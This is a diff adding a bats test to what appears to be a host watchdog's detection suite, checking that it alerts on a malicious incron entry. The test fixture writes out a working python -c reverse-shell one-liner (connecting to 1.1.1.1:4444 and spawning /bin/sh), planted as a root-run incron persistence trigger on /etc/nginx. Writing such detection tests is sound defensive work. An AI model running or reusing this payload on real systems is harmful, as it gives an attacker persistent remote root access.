@@ -254,3 +254,20 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on incron command surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the incron
+    # inotify-event-trigger root-exec persistence surface
+    # (T1546 — incron runs commands AS ROOT (system tables) on
+    # every matching inotify event — attacker plants watch on
+    # routinely-modified file to fire recurring callback).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${TAB}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
